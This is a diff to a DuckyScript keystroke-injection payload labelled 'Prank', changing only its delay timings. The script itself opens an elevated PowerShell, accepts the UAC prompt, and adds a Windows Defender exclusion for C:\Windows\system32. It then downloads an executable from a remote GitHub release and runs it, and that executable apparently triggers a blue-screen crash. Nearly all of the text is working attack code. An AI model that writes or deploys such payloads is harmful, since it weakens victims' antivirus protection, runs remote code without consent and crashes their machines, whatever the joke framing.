@@ -7,18 +7,18 @@ REM Category: Prank
 REM Display a video of Mario's levitating head asking if he can have your computer and invokes a BSOD.
 REM
 REM startup delay
-DELAY 500
+DELAY 2000
 GUI r
-DELAY 500
+DELAY 2000
 STRING powershell Start-Process powershell -Verb runAs
 CTRL-SHIFT ENTER
-DELAY 1500
+DELAY 2000
 SHIFT TAB
-DELAY 500
+DELAY 2000
 ENTER
-DELAY 1500
+DELAY 2000
 STRING Add-MpPreference -ExclusionPath C:\Windows\system32
 ENTER
-DELAY 500
+DELAY 2000
 STRING $down=New-Object System.Net.WebClient;$url='https://github.com/bemxio/mario-head/releases/latest/download/mario_dist.exe';$file='mario_dist.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 ENTER
